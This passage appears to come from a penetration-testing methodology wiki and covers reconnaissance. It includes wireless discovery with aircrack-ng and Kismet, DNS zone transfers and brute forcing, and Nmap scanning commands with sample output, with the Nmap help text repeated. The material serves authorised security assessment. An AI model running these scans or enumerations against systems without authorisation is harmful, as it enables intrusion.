[[:File:Penetration_Testing_Execution_13.png|Screenshot Here]] At a minimum a search engine (Google, Bing, and Yahoo!) should be utilized to conduct the following searches: \"Target Company\" scanner \"Target Company\" frequency \"Target Company\" guard frequency \"Target Company\" MHz Press releases from radio manufactures and reseller regarding the target Press releases from guard outsourcing companies talking about contracts with the target company Frequency Usage A frequency counter is an electronic instrument that is used for measuring the number of oscillations or pulses per second in a repetitive electronic signal. Using a Frequency counter or spectrum analyzer it is possible to identify the transmitting frequencies in use around the target facility. Common frequencies include the following: {|border#\"2\" cellspacing#\"0\" cellpadding#\"4\" width#\"100%\" | '''Band''' | '''Frequency Range''' |- |VHF |150 - 174 MHz |- |UHF |420 - 425 MHz |- |UHF |450 - 470 MHz |- |UHF |851 - 866 MHz |- |VHF |43.7- 50 MHz |- |UHF |902 - 928 MHz |- |UHF |2400 - 2483.5 MHz |} A spectrum analyzer can be used to visually illustrate the frequencies in use. These are usually targeting specific ranges that are generally more focused than a frequency counter. Below is an output from a spectrum analyzer that can clearly illustrate the frequencies in use. The sweep range for this analyzer is 2399-2485 MHz. [[:File:Penetration_Testing_Execution_14.png|Screenshot Here]] All frequency ranges in use in and around the target should be documented. Equipment Identification As part of the on-site survey, all radios and antennas in use should be identified. Including radio make and model as well as the length and type of antennas utilized. A few good file_suport are available to help you identify radio equipment: {|border#\"2\" cellspacing#\"0\" cellpadding#\"4\" width#\"100%\" | '''Site''' | '''URL''' | '''Description''' |- |HamRadio Outlet |[ http://www.hamradio.com/ http://www.hamradio.com ] |A great source of information for amateur radios |- |BatLabs |[ http://www.batlabs.com/ http://www.batlabs.com ] |A great source of information for Motorola two way systems |} Identifying 802.11 equipment is usually much easier to accomplish, if not visually, then via RF emissions. For visual identification, most vendor websites can be searched to identify the specific make and model of the equipment in use. {|border#\"2\" cellspacing#\"0\" cellpadding#\"4\" width#\"100%\" | '''Manufacturer''' | '''URL''' |- |3com |[ http://www.3com.com/ http://www.3com.com ] |- |Apple |[ http://www.apple.com/ http://www.apple.com ] |- |Aruba |[ http://www.arubanetworks.com/ http://www.arubanetworks.com ] |- |Atheros |[ http://www.atheros.com/ http://www.atheros.com/ ] |- |Belkin |[ http://www.belkin.com/ http://www.belkin.com ] |- |Bluesocket |[ http://www.bluesocket.com/ http://www.bluesocket.com/ ] |- |Buffalo Technology |[ http://www.buffalotech.com/ http://www.buffalotech.com ] |- |Cisco |[ http://www.cisco.com/ http://www.cisco.com ] |- |Colubris |[ http://www.colubris.com/ http://www.colubris.com/ ] |- |D-Link |[ http://www.dlink.com/ http://www.dlink.com ] |- |Engenius Tech |[ http://www.engeniustech.com/ http://www.engeniustech.com ] |- |Enterasys |[ http://www.enterasys.com/ http://www.enterasys.com ] |- |Hewlett Packard |[ http://www.hp.com/ http://www.hp.com ] |- |Juniper |[ http://www.juniper.net/ http://www.juniper.net ] |- |Marvell |[ http://www.marvell.com/ http://www.marvell.com ] |- |Motorola |[ http://www.motorola.com/ http://www.motorola.com ] |- |Netgear |[ http://www.netgear.com/ http://www.netgear.com ] |- |Ruckus Wireless |[ http://www.ruckuswireless.com/ http://www.ruckuswireless.com/ ] |- |SMC |[ http://www.smc.com/ http://www.smc.com ] |- |Trapeze |[ http://www.trapezenetworks.com/ http://www.trapezenetworks.com/ ] |- |TRENDnet |[ http://www.trendnet.com/ http://www.trendnet.com ] |- |Versa Technology |[ http://www.versatek.com/ http://www.versatek.com ] |} In a passive manner, it is possible to identify at the manufacturer based upon data collected from RF emissions. Wireless Local Area Network (WLAN) discovery consists of enumerating the type of WLAN that is currently deployed. This can be one of the following: Unencrypted WLAN, WEP encrypted WLAN, WPA / WPA2 encrypted WLAN, LEAP encrypted WLAN, or 802.1x WLAN. The tools required to enumerate this information are highlighted as follows. Airmon-ng Airmon-ng is used to enable monitor mode on wireless interfaces. It may also be used to go back from monitor mode to managed mode. It is important to determine if our USB devices are properly detected. For this we can use lsusb, to list the currently detected USB devices. [[:File:Penetration_Testing_Execution_15.png|Screenshot Here]] As the figure illustrates, our distribution has detected not only the Prolific PL2303 Serial Port, where we have our USB GPS connected, but also the Realtek RTL8187 Wireless Adapter. Now that we have determined that our distribution recognizes the installed devices, we need to determine if the wireless adapter is already in monitor mode by running. Entering the airmon-ng command without parameters will show the interfaces status. [[:File:Penetration_Testing_Execution_16.png|Screenshot Here]] To use one interface simply use airmon-ng to put your card in monitor mode by running: airmon-ng start wlan0 [[:File:Penetration_Testing_Execution_17.png|Screenshot Here]] If there's an existing mon0, destroy it prior to issuing the previous command: airmon-ng stop mon0 Once again, entering the airmon-ng command without parameters will show the interfaces status. [[:File:Penetration_Testing_Execution_18.png|Screenshot Here]] Airodump-ng Airodump-ng is part of the Aircrack-ng is a network software suite. Specifically, Airodump-ng is a packet sniffer that places air traffic into Packet Capture (PCAP) files or Initialization Vectors (IVS) files and shows information about wireless networks. Airodump-ng is used for packet capture of raw 802.11 frames and is particularly suitable for collecting WEP IVs (Initialization Vectors) for later use with Aircrack-ng. If you have a GPS receiver connected to the computer, Airodump-ng is capable of logging the coordinates of the found APs. Before running Airodump-ng, start the Airmon-ng script to list the detected wireless interfaces. Usage: airodump-ng < options > < interface > [ , < interface > ... ] Options: --ivs : Save only captured IVs --gpsd : Use GPSd --write < prefix > : Dump file prefix -w : same as --write --beacons : Record all beacons in dump file --update < secs > : Display update delay in seconds --showack : Prints ack/cts/rts statistics -h : Hides known stations for --showack -f < msecs > : Time in ms between hopping channels --berlin < secs > : Time before removing the AP/client from the screen when no more packets are received (Default: 120 seconds) -r < file > : Read packets from that file -x < msecs > : Active Scanning Simulation --output-format < formats > : Output format. Possible values: pcap, ivs, csv, gps, kismet, netxml Short format \"-o\" The option can be specified multiple times. In this case, each file format specified will be output. Only ivs or pcap can be used, not both. Airodump-ng will display a list of detected APs and a list of connected clients (\"stations\"). [[:File:Penetration_Testing_Execution_19.png|Screenshot Here]] [[:File:Penetration_Testing_Execution_20.png|Screenshot Here]] The first line shows the current channel, elapsed running time, current date and optionally if a WPA/WPA2 handshake was detected. Kismet-Newcore Kismet-newcore is a network detector, packet sniffer, and intrusion detection system for 802.11 wireless LANs. Kismet will work with any wireless card which supports raw monitoring mode, and can sniff 802.11a, 802.11b, 802.11g, and 802.11n traffic. Kismet identifies networks by passively collecting packets and detecting standard named networks, detecting (and given time, decloaking) hidden networks, and inferring the presence of nonbeaconing networks via data traffic. Kismet is composed of 3 parts: '''Drones: '''Capture the wireless traffic to report it to the server; they have to be started manually. '''Server: '''Central place that connects to the drones and accepts client connections. It can also capture wireless traffic. '''Client: '''The GUI part that will connect to the server. Kismet has to be configured to work properly. First, we need to determine if it is already in monitor mode by running: airmon-ng [[:File:Penetration_Testing_Execution_21.png|Screenshot Here]] To use one interface simply use airmon-ng to put your card in monitor mode by running: airmon-ng start wlan0 [[:File:Penetration_Testing_Execution_22.png|Screenshot Here]] If there's an existing mon0, destroy it prior to issuing the previous command: airmon-ng stop mon0 Kismet is able to use more than one interface like Airodump-ng. To use that feature, /etc/kismet/kismet.conf has to be edited manually as airmon-ng cannot configure more than one interface for kismet. For each adapter, add a source line into kismet.conf. Note:''' '''By default kismet stores its capture files in the directory where it is started. These captures can be used with Aircrack-ng. Typing, \"kismet\" in a console and hitting \"Enter\" will start up Kismet. [[:File:Penetration_Testing_Execution_23.png|Screenshot Here]] As described earlier Kismet consists of three components and the initial screen informs us that we need to either start the Kismet server or choose to use a server that has been started elsewhere. For our purposes. we will click \"Yes\" to start the Kismet server locally. [[:File:Penetration_Testing_Execution_24.png|Screenshot Here]] Kismet presents us with the options to choose as part of the server startup process. [[:File:Penetration_Testing_Execution_25.png|Screenshot Here]] Unless we configured a source in /etc/kismet/kismet.conf then we will need to specify a source from where we want to capture packets. [[:File:Penetration_Testing_Execution_26.png|Screenshot Here]] As referenced earlier, we created a monitor sub-interface from our wireless interface. For our purposes, we will enter \"mon0\", though your interface may have a completely different name. [[:File:Penetration_Testing_Execution_27.png|Screenshot Here]] When Kismet server and client are running properly then wireless networks should start to show up. We have highlighted a WEP enabled network. There are numerous sorting options that you can choose from. We will not cover all the functionality of Kismet at this point, but if you're not familiar with the interface you should play with it until you get comfortable. inSSIDer If you are used to using Netstumbler you may be disappointed to hear that it doesn't function properly with Windows Vista and 7 (64-bit). That being said, all is not lost as there is an alternative that is compatible with Windows XP, Vista and 7 (32 and 64-bit). It makes use of the native Wi-Fi API and is compatible with most GPS devices (NMEA v2.3 and higher). InSSIDer has some features that make it the tool of choice if you're using Windows. InSSIDer can track the strength of received signal in dBi over time, filter access points, and also export Wi-Fi and GPS data to a KML file to view in Google Earth. [[:File:Penetration_Testing_Execution_28.png|Screenshot Here]] External Footprinting The External Footprinting phase of Intelligence Gathering involves collecting response results from a target based upon direct interaction from an external perspective. The goal is to gather as much information about the target as possible. Identifying IP Ranges For external footprinting, we first need to determine which one of the WHOIS servers contains the information we're after. Given that we should know the TLD for the target domain, we simply have to locate the Registrar that the target domain is registered with. WHOIS information is based upon a tree hierarchy. ICANN (IANA) is the authoritative registry for all of the TLDs and is a great starting point for all manual WHOIS queries. WHOIS lookup ICANN - http://www.icann.org IANA - http://www.iana.com NRO - http://www.nro.net AFRINIC - http://www.afrinic.net APNIC - http://www.apnic.net ARIN - http://ws.arin.net LACNIC - http://www.lacnic.net RIPE - http://www.ripe.net Once the appropriate Registrar was queried we can obtain the Registrant information. There are numerous sites that offer WHOIS information; however for accuracy in documentation, you need to use only the appropriate Registrar. InterNIC - http://www.internic.net/ http://www.internic.net ] BGP looking glasses It is possible to identify the Autonomous System Number (ASN) for networks that participate in Border Gateway Protocol (BGP). Since BGP route paths are advertised throughout the world we can find these by using a BGP4 and BGP6 looking glass. BGP4 - [ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg http][ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg ://][ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg www][ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg .][ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg bgp][ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg 4.][ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg as][ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg /][ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg looking][ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg -][ http://www.google.com/url?q#http%3A%2F%2Fwww.bgp4.as%2Flooking-glasses&sa#D&sntz#1&usg#AFQjCNGJNLNRaL6xeGcya4mZ9NPyOFd8Tg glasses] BPG6 - [ http://lg.he.net/ http://lg.he.net/ ] Active Reconnaissance Manual browsing Google Hacking - [ http://www.exploit-db.com/google-dorks http://www.exploit-db.com/google-dorks ] Passive Reconnaissance Google Hacking - [ http://www.exploit-db.com/google-dorks http://www.exploit-db.com/google-dorks ] Active Footprinting The active footprinting phase of Intelligence Gathering involves gathering response results from a target based upon direct interaction. Zone Transfers DNS zone transfer, also known as AXFR, is a type of DNS transaction. It is a mechanism designed to replicate the databases containing the DNS data across a set of DNS servers. Zone transfer comes in two flavors, full (AXFR) and incremental (IXFR). There are numerous tools available to test the ability to perform a DNS zone transfer. Tools commonly used to perform zone transfers are host, dig, and nmap. Host host < domain > < DNS server > Dig dig @server domain axfr Reverse DNS Reverse DNS can be used to obtain valid server names in use within an organizational. There is a caveat that it must have a PTR (reverse) DNS record for it to resolve a name from a provided IP address. If it does resolve then the results are returned. This is usually performed by testing the server with various IP addresses to see if it returns any results. DNS Bruting After identifying all the information that is associated with the client domain(s), it is now time to begin to query DNS. Since DNS is used to map IP addresses to hostnames, and vice versa we will want to see if it is insecurely configure. We will seek to use DNS to reveal additional information about the client. One of the most serious misconfigurations involving DNS is allowing Internet users to perform a DNS zone transfer. There are several tools that we can use to enumerate DNS to not only check for the ability to perform zone transfers, but to potentially discover additional host names that are not commonly known. Fierce2 (Linux) For DNS enumeration, there are two tools that are utilized to provide the desired results. The first that we will focus on is named Fierce2. As you can probably guess, this is a modification on Fierce. Fierce2 has lots of options, but the one that we want to focus on attempts to perform a zone transfer. If that is not possible, then it performs DNS queries using various server names in an effort to enumerate the host names that have been registered. The command to run ''fierce2'' is as follows: fierce -dns < client domain > -prefix < wordlist > ''' [[:File:Penetration_Testing_Execution_29.png|Screenshot Here]] ''' There is a common prefix (called common-tla.txt) wordlist that has been composed to utilize as a list when enumerating any DNS entries. This can be found at the following URL: :https://address-unknown/ DNSEnum (Linux) An alternative to Fierce2 for DNS enumeration is DNSEnum. As you can probably guess, this is very similar to Fierce2. DNSEnum offers the ability to enumerate DNS through brute forcing subdomains, performing reverse lookups, listing domain network ranges, and performing whois queries. It also performs Google scraping for additional names to query. ''' [[:File:Penetration_Testing_Execution_30.png|Screenshot Here]] ''' The command to run ''dnsenum'' is as follows: dnsenum -enum -f < wordlist > < client domain > ''' [[:File:Penetration_Testing_Execution_31.png|Screenshot Here]] ''' Again, there is a common prefix wordlist that has been composed to utilize as a list when enumerating any DNS entries. This can be found at the following URL: :https://address-unknown/ Dnsdict6 (Linux) Dnsdict6, which is part of the THC IPv6 Attack Toolkit, is an IPv6 DNS dictionary brute forcer. The options are relatively simple, but simply specify the domain and a dictionary-file. [[:File:Penetration_Testing_Execution_32.png|Screenshot Here]] Port Scanning Nmap (Windows/Linux) Nmap (\"Network Mapper\") is the de facto standard for network auditing/scanning. Nmap runs on both Linux and Windows. Nmap is available in both command line and GUI versions. For the sake of this document, we will only cover the command line. Nmap 5.51 ( http://nmap.org ) Usage: nmap [Scan Type(s)] [Options] {target specification} TARGET SPECIFICATION: Can pass hostnames, IP addresses, networks, etc. Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL : Input from list of hosts/networks -iR : Choose random targets --exclude : Exclude hosts/networks --excludefile : Exclude list from file HOST DISCOVERY: -sL: List Scan - simply list targets to scan -sn: Ping Scan - disable port scan -Pn: Treat all hosts as online -- skip host discovery -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes -PO[protocol list]: IP Protocol Ping -n/-R: Never do DNS resolution/Always resolve [default: sometimes] --dns-servers : Specify custom DNS servers --system-dns: Use OS's DNS resolver --traceroute: Trace hop path to each host SCAN TECHNIQUES: -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans -sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans --scanflags : Customize TCP scan flags -sI : Idle scan -sY/sZ: SCTP INIT/COOKIE-ECHO scans -sO: IP protocol scan -b : FTP bounce scan PORT SPECIFICATION AND SCAN ORDER: -p : Only scan specified ports Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 -F: Fast mode - Scan fewer ports than the default scan -r: Scan ports consecutively - don't randomize --top-ports : Scan most common ports --port-ratio : Scan ports more common than SERVICE/VERSION DETECTION: -sV: Probe open ports to determine service/version info --version-intensity : Set from 0 (light) to 9 (try all probes) --version-light: Limit to most likely probes (intensity 2) --version-all: Try every single probe (intensity 9) --version-trace: Show detailed version scan activity (for debugging) SCRIPT SCAN: -sC: equivalent to --script#default --script# : is a comma separated list of directories, script-files or script-categories --script-args# : provide arguments to scripts --script-trace: Show all data sent and received --script-updatedb: Update the script database. OS DETECTION: -O: Enable OS detection --osscan-limit: Limit OS detection to promising targets --osscan-guess: Guess OS more aggressively TIMING AND PERFORMANCE: Options which take are in seconds, or append 'ms' (milliseconds), 's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m). -T < 0-5>: Set timing template (higher is faster) --min-hostgroup/max-hostgroup : Parallel host scan group sizes --min-parallelism/max-parallelism : Probe parallelization --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout : Specifies probe round trip time. --max-retries : Caps number of port scan probe retransmissions. --host-timeout : Give up on target after this long --scan-delay/--max-scan-delay : Adjust delay between probes --min-rate : Send packets no slower than per second --max-rate : Send packets no faster than per second FIREWALL/IDS EVASION AND SPOOFING: -f; --mtu : fragment packets (optionally w/given MTU) -D : Cloak a scan with decoys -S : Spoof source address -e : Use specified interface -g/--source-port : Use given port number --data-length : Append random data to sent packets --ip-options : Send packets with specified ip options --ttl : Set IP time-to-live field --spoof-mac : Spoof your MAC address --badsum: Send packets with a bogus TCP/UDP/SCTP checksum OUTPUT: -oN/-oX/-oS/-oG : Output scan in normal, XML, s| : Output in the three major formats at once -v: Increase verbosity level (use -vv or more for greater effect) -d: Increase debugging level (use -dd or more for greater effect) --reason: Display the reason a port is in a particular state --open: Only show open (or possibly open) ports --packet-trace: Show all packets sent and received --iflist: Print host interfaces and routes (for debugging) --log-errors: Log errors/warnings to the normal-format output file --append-output: Append to rather than clobber specified output files --resume : Resume an aborted scan --stylesheet : XSL stylesheet to transform XML output to HTML --webxml: Reference stylesheet from Nmap.Org for more portable XML --no-stylesheet: Prevent associating of XSL stylesheet w/XML output MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute --datadir : Specify custom Nmap data file location --send-eth/--send-ip: Send using raw ethernet frames or IP packets --privileged: Assume that the user is fully privileged --unprivileged: Assume the user lacks raw socket privileges -V: Print version number -h: Print this help summary page. EXAMPLES: nmap -v -A scanme.nmap.org nmap -v -sn 192.168.0.0/16 10.0.0.0/8 nmap -v -iR 10000 -Pn -p 80 SEE THE MAN PAGE (http://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES Nmap has dozens of options available. Since this section is dealing with port scanning, we will focus on the commands required to perform this task. It is important to note that the commands utilized depend mainly on the time and number of hosts being scanned. The more hosts or less time that you have to perform this tasks, the less that we will interrogate the host. This will become evident as we continue to discuss the options. Based on the IP set being assessed you would want to scan both the TCP and UDP ports across the range 1 to 65535. The command that will be utilized is as follows: nmap -A -PN -sU -sS -T2 -v -p 1-65535 < client ip range > / < CIDR > or < Mask > -oA NMap_FULL_ < client ip range > nmap -A -PN -sU -sS -T2 -v -p 1-65535 client.com -oA NMap_FULL_client Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:27 Eastern Daylight Time NSE: Loaded 57 scripts for scanning. Initiating Parallel DNS resolution of 1 host. at 22:27 Completed Parallel DNS resolution of 1 host. at 22:27, 0.10s elapsed Initiating SYN Stealth Scan at 22:27 Scanning client.com (74.117.116.73) [65535 ports] Discovered open port 80/tcp on 74.117.116.73 On large IP sets, those greater than 100 IP addresses, do not specify a port range. The command that will be utilized is as follows: nmap -A -O -PN < client ip range > / < CIDR > or < Mask > -oA NMap_ < client ip range > nmap -A -O -PN client.com -oA NMap_client Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:37 Eastern Daylight Time Nmap scan report for client.com (74.117.116.73) Host is up (0.13s latency). rDNS record for 74.117.116.73: 74-117-116-73.parked.com Not shown: 999 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.2.3 ((CentOS)) | http-robots.txt: 2 disallowed entries |_/click.php /ud.php |_http-title: client.com |_http-methods: No Allow or Public header in OPTIONS response (status code 200) |_http-favicon: Parked.com domain parking Warning: OSScan results may be unreliable because we could not find at least 1 o pen and 1 closed port Device type: general purpose Running (JUST GUESSING): Linux 2.6.X (92%), OpenBSD 4.X (88%), FreeBSD 6.X (88%) It should be noted that Nmap has limited options for IPv6. These include TCP connect (-sT), Ping scan (-sn), List scan (-sL) and version detection. nmap -6 -sT -P0 fe80::80a5:26f2:8db7:5d04%12 Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:42 Eastern Daylight Time Nmap scan report for lancelot (fe80::80a5:26f2:8db7:5d04) Host is up (1.0s latency). Not shown: 988 closed ports PORT STATE SERVICE 135/tcp open msrpc 445/tcp open microsoft-ds 554/tcp open rtsp 2869/tcp open icslap 3389/tcp open ms-term-serv 5000/tcp open upnp 5001/tcp open commplex-link 5002/tcp open rfe 5003/tcp open filemaker 5004/tcp open avt-profile-1 5357/tcp open wsdapi 10243/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 287.05 seconds SNMP Sweeps SNMP sweeps are performed too as they offer tons of information about a specific system. The SNMP protocol is a stateless, datagram oriented protocol. Unfortunately SNMP servers don't respond to requests with invalid community strings and the underlying UDP protocol does not reliably report closed UDP ports. This means that \"no response\" from a probed IP address can mean either of the following: machine unreachable SNMP server not running invalid community string the response datagram has not yet arrived SNMPEnum (Linux) SNMPEnum is a perl script that sends SNMP requests to a single host, then waits for the response to come back and logs them. [[:File:Penetration_Testing_Execution_37.png|Screenshot Here]] SMTP Bounce Back SMTP bounce back, also called a Non-Delivery Report/Receipt (NDR), a (failed) Delivery Status Notification (DSN) message, a Non-Delivery Notification (NDN) or simply a bounce, is an automated electronic mail message from a mail system informing the sender of another message about a delivery problem. This can be used to assist an attacker in fingerprint the SMTP server as SMTP server information, including software and versions, may be included in a bounce message. Banner Grabbing Banner Grabbing is an enumeration technique used to glean information about computer systems on a network and the services running its open ports. Banner grabbing is used to identify network the version of applications and operating system that the target host are running. Banner grabbing is usually performed on Hyper Text Transfer Protocol (HTTP), File Transfer Protocol (FTP), and Simple Mail Transfer Protocol (SMTP); ports 80, 21, and 25 respectively. Tools commonly used to perform banner grabbing are Telnet, nmap, and Netcat. HTTP JUNK / HTTP/1.0 HEAD / HTTP/9.3 OPTIONS / HTTP/1.0 HEAD / HTTP/1.0 Internal Footprinting The Internal Footprinting phase of Intelligence Gathering involves gathering response results from a target based upon direct interaction from an internal perspective. The goal is to gather as much information about the target as possible. Active Footprinting The active footprinting phase of Intelligence Gathering involves gathering response results from a target based upon direct interaction. Ping Sweeps Active footprinting begins with the identification of live systems. This is usually performed by conducting a Ping sweep to determine which hosts respond. Nmap (Windows/Linux) Nmap (\"Network Mapper\") is the de facto standard for network auditing/scanning. Nmap runs on both Linux and Windows. Nmap is available in both command line and GUI versions. For the sake of this document, we will only cover the command line. Nmap 5.51 ( http://nmap.org ) Usage: nmap [Scan Type(s)] [Options] {target specification} TARGET SPECIFICATION: Can pass hostnames, IP addresses, networks, etc. Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL : Input from list of hosts/networks -iR : Choose random targets --exclude : Exclude hosts/networks --excludefile : Exclude list from file HOST DISCOVERY: -sL: List Scan - simply list targets to scan -sn: Ping Scan - disable port scan -Pn: Treat all hosts as online -- skip host discovery -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes -PO[protocol list]: IP Protocol Ping -n/-R: Never do DNS resolution/Always resolve [default: sometimes] --dns-servers : Specify custom DNS servers --system-dns: Use OS's DNS resolver --traceroute: Trace hop path to each host SCAN TECHNIQUES: -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans -sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans --scanflags : Customize TCP scan flags -sI : Idle scan -sY/sZ: SCTP INIT/COOKIE-ECHO scans -sO: IP protocol scan -b : FTP bounce scan PORT SPECIFICATION AND SCAN ORDER: -p : Only scan specified ports Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 -F: Fast mode - Scan fewer ports than the default scan -r: Scan ports consecutively - don't randomize --top-ports : Scan most common ports --port-ratio : Scan ports more common than SERVICE/VERSION DETECTION: -sV: Probe open ports to determine service/version info --version-intensity : Set from 0 (light) to 9 (try all probes) --version-light: Limit to most likely probes (intensity 2) --version-all: Try every single probe (intensity 9) --version-trace: Show detailed version scan activity (for debugging) SCRIPT SCAN: -sC: equivalent to --script#default --script# : is a comma separated list of directories, script-files or script-categories --script-args# : provide arguments to scripts --script-trace: Show all data sent and received --script-updatedb: Update the script database. OS DETECTION: -O: Enable OS detection --osscan-limit: Limit OS detection to promising targets --osscan-guess: Guess OS more aggressively TIMING AND PERFORMANCE: Options which take are in seconds, or append 'ms' (milliseconds), 's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m). -T < 0-5>: Set timing template (higher is faster) --min-hostgroup/max-hostgroup : Parallel host scan group sizes --min-parallelism/max-parallelism : Probe parallelization --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout : Specifies probe round trip time. --max-retries : Caps number of port scan probe retransmissions. --host-timeout : Give up on target after this long --scan-delay/--max-scan-delay : Adjust delay between probes --min-rate : Send packets no slower than per second --max-rate : Send packets no faster than per second FIREWALL/IDS EVASION AND SPOOFING: -f; --mtu : fragment packets (optionally w/given MTU) -D : Cloak a scan with decoys -S : Spoof source address -e : Use specified interface -g/--source-port : Use given port number --data-length : Append random data to sent packets --ip-options : Send packets with specified ip options --ttl : Set IP time-to-live field --spoof-mac : Spoof your MAC address --badsum: Send packets with a bogus TCP/UDP/SCTP checksum OUTPUT: -oN/-oX/-oS/-oG : Output scan in normal, XML, s| : Output in the three major formats at once -v: Increase verbosity level (use -vv or more for greater effect) -d: Increase debugging level (use -dd or more for greater effect) --reason: Display the reason a port is in a particular state --open: Only show open (or possibly open) ports --packet-trace: Show all packets sent and received --iflist: Print host interfaces and routes (for debugging) --log-errors: Log errors/warnings to the normal-format output file --append-output: Append to rather than clobber specified output files --resume : Resume an aborted scan --stylesheet : XSL stylesheet to transform XML output to HTML --webxml: Reference stylesheet from Nmap.Org for more portable XML --no-stylesheet: Prevent associating of XSL stylesheet w/XML output MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute --datadir : Specify custom Nmap data file location --send-eth/--send-ip: Send using raw ethernet frames or IP packets --privileged: Assume that the user is fully privileged --unprivileged: Assume the user lacks raw socket privileges -V: Print version number -h: Print this help summary page. EXAMPLES: nmap -v -A scanme.nmap.org nmap -v -sn 192.168.0.0/16 10.0.0.0/8 nmap -v -iR 10000 -Pn -p 80 SEE THE MAN PAGE (http://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES Nmap has dozens of options available. Since this section is dealing with port scanning, we will focus on the commands required to perform this task. It is important to note that the commands utilized depend mainly on the time and number of hosts being scanned. The more hosts or less time that you have to perform this tasks, the less that we will interrogate the host. This will become evident as we continue to discuss the options. To perform a ping sweep you would want to utilize the following command: nmap -sn < client ip range > / < CIDR > or < Mask > nmap -sn 10.25.0.0/24 Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:58 Eastern Daylight Time Nmap scan report for 10.25.0.1 Host is up (0.0030s latency). MAC Address: C0:C1:C0:09:5C:16 (Unknown) Nmap scan report for 10.25.0.111 Host is up (0.013s latency). MAC Address: A8:E3:EE:97:3D:46 (Sony Computer Entertainment) Nmap scan report for 10.25.0.113 Host is up. Nmap scan report for 10.25.0.119 Host is up (0.018s latency). MAC Address: 00:14:6C:B4:3A:93 (Netgear) Nmap done: 256 IP addresses (4 hosts up) scanned in 6.19 seconds Alive6 (Linux) Alive6, which is part of the THC IPv6 Attack Toolkit, offers the most effective mechanism for detecting all IPv6 systems. [[:File:Penetration_Testing_Execution_39.png|Screenshot Here]] Alive6 offers numerous options, but can be simply run by just specifying the interface. This returns all the IPv6 systems that are live on the local-link. [[:File:Penetration_Testing_Execution_40.png|Screenshot Here]] Port Scanning Nmap (Windows/Linux) Nmap (\"Network Mapper\") is the de facto standard for network auditing/scanning. Nmap runs on both Linux and Windows. Nmap is available in both command line and GUI versions. For the sake of this document, we will only cover the command line. Nmap 5.51 ( http://nmap.org ) Usage: nmap [Scan Type(s)] [Options] {target specification} TARGET SPECIFICATION: Can pass hostnames, IP addresses, networks, etc. Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL : Input from list of hosts/networks -iR : Choose random targets --exclude : Exclude hosts/networks --excludefile : Exclude list from file HOST DISCOVERY: -sL: List Scan - simply list targets to scan -sn: Ping Scan - disable port scan -Pn: Treat all hosts as online -- skip host discovery -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes -PO[protocol list]: IP Protocol Ping -n/-R: Never do DNS resolution/Always resolve [default: sometimes] --dns-servers : Specify custom DNS servers --system-dns: Use OS's DNS resolver --traceroute: Trace hop path to each host SCAN TECHNIQUES: -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans -sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans --scanflags : Customize TCP scan flags -sI : Idle scan -sY/sZ: SCTP INIT/COOKIE-ECHO scans 